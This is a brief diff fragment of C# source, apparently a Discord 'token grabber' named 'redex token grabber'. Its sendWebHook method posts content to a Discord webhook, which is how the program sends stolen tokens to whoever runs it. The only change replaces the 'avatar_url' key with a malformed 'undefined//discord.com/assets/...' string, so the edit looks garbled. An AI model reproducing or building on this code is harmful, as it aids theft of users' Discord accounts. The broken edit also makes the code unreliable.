@@ -89,7 +89,7 @@ public static void sendWebHook(string discordWebHook,string content)
                 "redex token grabber"
             },
             {
-                "avatar_url",
+                "undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png",
                 "https://discord.com/channels/@me/910580649482674176"
 
             }
